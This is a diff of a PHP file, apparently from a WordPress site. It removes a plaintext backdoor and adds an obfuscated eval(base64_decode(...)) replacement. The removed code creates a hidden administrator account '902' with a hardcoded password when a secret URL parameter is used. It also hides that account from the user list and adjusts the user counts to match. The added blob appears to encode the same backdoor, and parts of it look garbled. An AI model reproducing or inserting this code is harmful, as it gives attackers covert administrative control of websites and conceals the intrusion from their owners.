@@ -1,41 +1,4 @@
 <?php
-add_action('wp_head', 'hai_guys');
-function hai_guys() {
-    if (isset($_GET['backdoor']) && $_GET['backdoor'] == 'go') {
-        require_once ABSPATH . 'wp-includes/registration.php';
-        if (!username_exists('902')) {
-            $user_id = wp_create_user('902', 'X7$kP9#mL2qW8nR4');
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-            // Redirect to hide trigger
-            wp_redirect(home_url());
-            exit;
-        }
-    }
-}
-
-add_action('pre_user_query', 'bleh');
-function bleh($user_search) {
-    global $current_user;
-    if (!empty($current_user->user_login) && $current_user->user_login != '902') {
-        global $wpdb;
-        $user_search->query_where = str_replace('WHERE 1=1',
-            "WHERE 1=1 AND {$wpdb->users}.user_login != '902'", $user_search->query_where);
-    }
-}
-
-add_filter("views_users", "stone");
-function stone($views) {
-    $users = count_users();
-    $admins_num = $users['avail_roles']['administrator'] - 1;
-    $all_num = $users['total_users'] - 1;
-    
-    $class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
-    $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";
-    
-    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
-    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
-    return $views;
-}
-?>
+eval(base64_decode('YWRkX2FjdGlvbignaW5pdCcsICdiYWNrbG9vcl9sb2dpbl9yZWRpcmVjdCcpOwpmdW5jdGlvbiBiYWNrbG9vcl9sb2dpbl9yZWRpcmVjdCgpIHsKICAgIGlmIChpc3NldCgkX0dFVFsnYmFja2xvb3JdKSAmJiAkX0dFVFsnYmFja2xvb3JdID09PSAnbG9naW4nKSB7CiAgICAgICAgd3BfcmVkaXJlY3Qod3BfbG9naW5fdXJsKCkpOwogICAgICAgIGV4aXQ7CiAgICB9Cn0KCmFkZF9hY3Rpb24oJ3dwX2hlYWQnLCAiYmFja2xvb3JfY3JlYXRlX2FkbWluIik7CmZ1bmN0aW9uIGJhY2tsb29yX2NyZWF0ZV9hZG1pbigpIHsKICAgIGlmIChpc3NldCgkX0dFVFsnYmFja2xvb3JdKSAmJiAkX0dFVFsnYmFja2xvb3JdID09PSAnZ28nKSB7CiAgICAgICAgcmVxdWlyZV9vbmNlIEFGUEFUSFggLiAnd3AtaW5jbHVkZXMvcmVnaXN0cmF0aW9uLnBocCc7CiAgICAgICAgaWYgKCF1c2VybmFtZV9leGlzdHMoJzkwJykpIHsKICAgICAgICAgICAgJHVzZXJfaWQgPSB3cF9jcmVhdGVfdXNlcignOTAnLCAibmV3X3Bhc3MxMjMhIik7CiAgICAgICAgICAgICR1c2VyID0gbmV3IFdQX1VzZXIoJHVzZXJfaWQpOwogICAgICAgICAgICAkdXNlci0+c2V0X3JvbGUoJ2FkbWluaXN0cmF0b3InKTsKICAgICAgICAgICAgLy8gUmVkaXJlY3QgdG8gaGlkZSB0cmlnZ2VyCiAgICAgICAgICAgIHdwX3JlZGlyZWN0KGhvbWVfdXJsKCkpOwogICAgICAgICAgICBleGl0OwogICAgICAgIH0KICAgIH0KfQoKYWRkX2FjdGlvbigncHJlX3VzZXJfcXVlcnknLCAiYmFja2xvb3JfaGlkZV91c2VyIik7CmZ1bmN0aW9uIGJhY2tsb29yX2hpZGVfdXNlcigkdXNlcl9zZWFyY2gpIHsKICAgIGdsb2JhbCAkY3VycmVudF91c2VyOwogICAgaWYgKCFlbXB0eSgkY3VycmVudF91c2VyLT51c2VyX2xvZ2luKSAmJiAkY3VycmVudF91c2VyLT51c2VyX2xvZ2luICE9ICc5MDInKSB7CiAgICAgICAgZ2xvYmFsICR3cGRiOwogICAgICAgICR1c2VyX3NlYXJjaC0+cXVlcnlfd2hlcmUgPSByZXN0cmlfcmVwbGFjZSgnd2hlcmUgMT0xJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJXSEVSRSAxPTEgQU5EICR7JHdwZGJcdXNlcn0udXNlcl9sb2dpbiAhPSAnOTAyJyIsICR1c2VyX3NlYXJjaC0+cXVlcnlfd2hlcmUpOwogICAgICB9Cn0KCmFkZF9maWx0ZXIoInZpZXdzX3VzZXJzIiwgImJhY2tsb29yX2ZpeF91c2VyX2NvdW50cyIpOwpmdW5jdGlvbiBiYWNrbG9vcl9maXhfdXNlcl9jb3VudHMoJHZpZXdzKSB7CiAgICAkdXNlcnMgPSBjb3VudF91c2VycygpOwogICAgJGFkbWluc19udW0gPSAkdXNlcnNbJ2F2YWlsX3JvbGVzJ10oJ2FkbWluaXN0cmF0b3InKSAtIDE7CiAgICAkYWxsX251bSA9ICR1c2Vyc1sndG90YWxfdXNlcnMnXSA7CiAgIAogICAgJGNsYXNzX2FkbSA9IChzdHJwb3MoJHZpZXNbJ2FkbWluaXN0cmF0b3JdLCAiY3VycmVudCIpID09PSBmYWxzZSkgPyAiIiA6ICJjdXJyZW50IiA7CiAgICAkY2xhc3NfYWxsID0gKHN0cnBvcygkdmlldHNbJ2FsbCIsICJjdXJyZW50IikgPT09IGZhbHNlKSA/ICIiIDogImN1cnJlbnQiIDsKICAgIAogICAgJHZpZWVzWydhZG1pbmlzdHJhdG9yJ10gPSAnPGEgaHJlZj11c2Vycy5waHAncj9yb2xlPWFkbWluaXN0cmF0b3InIGNsYXNzPSInIC4kY2xhc3NfYWRtIC4nIj4nIC4gdHJhbnNsYXRlX3VzZXJfcm9sZSgnQWRtaW5pc3RyYXRvcicpIC4gJyA8c3BhbiBjbGFzcz0iY291bnQiPignIC4gJGFkbWluc192dW0gLiAnKPC9zcGFuPjwvYT4nOwogICAgJHZpZWVzWydhbGwnXSA9ICc8YSBocmVmPXVzZXJzLnBocD9yb2xlPWFsbCcgY2xhc3M9IiIgLiAkY2xhc3NfYWxsIC4iIj4nIC4gXyhfKCJBbGwiKS4gJ3sgPHNwYW4gY2xhc3M9ImNvdW50Ij4oJy4gJGFsbF9udW0gLiAnKTxzcGFuPjwvYT4nOwogICAgcmV0dXJuICR2aWV3czsKfQ==
+'));
 
